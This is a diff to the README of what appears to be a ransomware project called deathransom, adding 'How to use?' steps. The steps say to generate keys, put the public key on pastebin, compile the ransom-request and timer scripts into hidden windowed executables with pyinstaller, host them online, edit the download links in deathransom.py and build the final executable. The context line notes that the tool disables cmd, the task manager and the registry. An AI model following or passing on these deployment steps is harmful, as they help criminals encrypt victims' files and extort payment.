@@ -12,3 +12,9 @@ Then, downloads the ransom request script, disable cmd, taskmanager and the regi
 
 ## How to use?
 
+Generate the keys, upload the public key to pastebin, copy the raw link, and change the site on the line 7 in deathransom.py  ``` python generate_key.py ```                                                                                                                     
+Transform time_script.py and main.py(Located at Ransom Request) into exe.                                                      
+Transform the time_script into exe using pyinstaller in python2 version typing ``` pyinstaller --onefile --windowed <FILE> ```                                                                                                                                    
+To transform the main of ransom request we will use the pyinstaller in the python3 version ``` pyinstaller --onefile --windowed main.py ```
+Then uploads the scripts to any file hosting service and change the links on the line 28 and 31 in deathransom.py                        
+So just transform deathransom.py into exe using pyinstaller in python2 version and be happy :D
